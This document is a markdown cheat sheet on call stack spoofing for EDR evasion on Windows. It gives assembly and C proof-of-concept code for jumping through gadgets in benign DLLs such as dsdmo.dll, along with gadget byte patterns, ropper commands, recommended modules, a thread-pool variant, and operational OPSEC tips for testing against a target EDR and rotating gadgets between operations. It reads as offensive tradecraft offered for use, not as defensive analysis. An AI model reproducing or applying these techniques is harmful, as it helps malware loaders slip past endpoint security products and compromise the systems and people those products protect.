# Call Stack Spoofing - Quick Notes

## Core Concept
Insert benign module addresses into call stack to break EDR signature detection.

## The Principle
```
call instruction → adds caller address to stack
jmp instruction → does NOT add to stack
```

## The Technique
```assembly
; Instead of:
call LoadLibraryA           ; Direct call

; Do:
mov r10, LoadLibraryA_addr  ; Place in register
jmp gadget                  ; Jump to gadget
; Gadget: call r10; ret     ; Gadget calls it
```

## Result
```
Before: ntdll → kernelbase → ntdll → kernel32 → ntdll (DETECTED)
After:  ntdll → dsdmo → kernelbase → ntdll → ...  (EVADED)
```

## Gadget Requirements
1. `call reg` instruction (r10, rax, rbx, etc.)
2. `ret` within ~5 instructions
3. Non-suspicious module (not ntdll/kernel32)
4. Stable across Windows versions

## Example Gadget (dsdmo.dll)
```assembly
call r10           ; Execute function in r10
xor eax, eax       ; Clean return
add rsp, 0x28      ; Cleanup stack
ret                ; Return
```

## Implementation Pattern
```c
// 1. Find gadget
void* gadget = find_gadget("dsdmo.dll", pattern);

// 2. Setup
sub rsp, 0x28               // Match gadget's stack cleanup
mov r10, &LoadLibraryA      // Target function
mov rcx, "ws2_32.dll"       // Function arg

// 3. Execute
jmp gadget                  // Gadget calls LoadLibraryA

// Stack now contains dsdmo.dll address
```

## Finding Gadgets

### Manual (x64dbg/IDA)
```
1. Load target DLL
2. Search for bytes: 41 FF D2 (call r10)
3. Verify ret within 5 instructions
4. Note address and epilogue
```

### Automated (ropper)
```bash
ropper --file dsdmo.dll --search "call r10"
```

### Winbindex
Check gadget stability across Windows versions:
```
1. Go to winbindex.m417z.com
2. Search for DLL
3. Check multiple versions
4. Verify gadget exists/offset
```

## Common Gadgets

### call r10 (most versatile)
```assembly
41 FF D2        # call r10
```
Modules: dsdmo.dll, combase.dll, many others

### call rax
```assembly
FF D0           # call rax
```
Modules: user32.dll, kernel32.dll, many others

### call rbx
```assembly
FF D3           # call rbx
```
Modules: user32.dll, gdi32.dll

## Stack Cleanup Patterns
```assembly
# Pattern 1: Simple
call r10
ret

# Pattern 2: With cleanup
call r10
add rsp, 0x20
ret

# Pattern 3: With XOR
call r10
xor eax, eax
add rsp, 0x28
ret
```

Match your shellcode to gadget's epilogue.

## Module Selection

### Best Choices
- dsdmo.dll (Display Settings)
- combase.dll (COM Base)
- propsys.dll (Property System)
- apphelp.dll (Application Compatibility)

### Acceptable
- user32.dll (Common but works)
- gdi32.dll (Graphics)
- ole32.dll (OLE)

### Avoid
- ntdll.dll (Monitored)
- kernel32.dll (Monitored)
- kernelbase.dll (Monitored)
- security-related DLLs

## Quick POC
```c
typedef void* (*LOADLIBRARY)(const char*);

void* call_via_gadget(void* gadget, void* function, void* arg) {
    __asm__ volatile (
        "sub rsp, 0x28\n"
        "mov r10, %1\n"
        "mov rcx, %2\n"
        "jmp %0\n"
        : : "r"(gadget), "r"(function), "r"(arg)
    );
}

// Usage
HMODULE dsdmo = LoadLibrary("dsdmo.dll");
void* gadget = (char*)dsdmo + 0x1234;  // Gadget offset
void* ws2_32 = call_via_gadget(gadget, &LoadLibraryA, "ws2_32.dll");
```

## Integration with Thread Pool
```c
typedef struct {
    void* gadget;
    void* function;
    void* arg;
} TP_CONTEXT;

VOID CALLBACK TpCallback(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID Context,
    PTP_WORK Work
) {
    TP_CONTEXT* ctx = (TP_CONTEXT*)Context;

    __asm__ volatile (
        "sub rsp, 0x28\n"
        "mov r10, %0\n"
        "mov rcx, %1\n"
        "jmp %2\n"
        : : "r"(ctx->function), "r"(ctx->arg), "r"(ctx->gadget)
    );
}
```

## Limitations
- ⚠️ Windows version dependent
- ⚠️ Module must be loaded
- ⚠️ Specific to call stack detection
- ⚠️ May be detected in future
- ⚠️ Not a silver bullet

## Combination with Other Techniques
```c
// Layer 1: Call stack spoofing (this technique)
execute_via_gadget(gadget, &LoadLibraryA, "ws2_32.dll");

// Layer 2: Sleep Mask
mask_memory_during_sleep();

// Layer 3: Syscalls
use_direct_syscalls();

// Result: Multi-layer evasion
```

## Testing
```bash
# 1. Build payload with gadget
./link loader_with_gadget.spec

# 2. Test in lab with Elastic
# Deploy to test VM
# Load network DLL
# Check Elastic alerts

# 3. Verify stack
# Use WinDbg: k command
# Verify gadget module in stack
```

## Debugging
```
WinDbg commands:
k           - Show call stack
lm          - List modules
u <addr>    - Disassemble at address
bp <addr>   - Set breakpoint
g           - Go/continue
```

## OPSEC Tips
1. ✅ Rotate gadget modules per operation
2. ✅ Combine with other evasions
3. ✅ Test against target EDR
4. ✅ Use uncommon modules
5. ❌ Don't reuse same gadget
6. ❌ Don't share gadgets publicly
7. ❌ Don't rely on single technique

## Tags
`#call-stack` `#edr-evasion` `#elastic` `#gadgets` `#thread-pool` `#signatures`
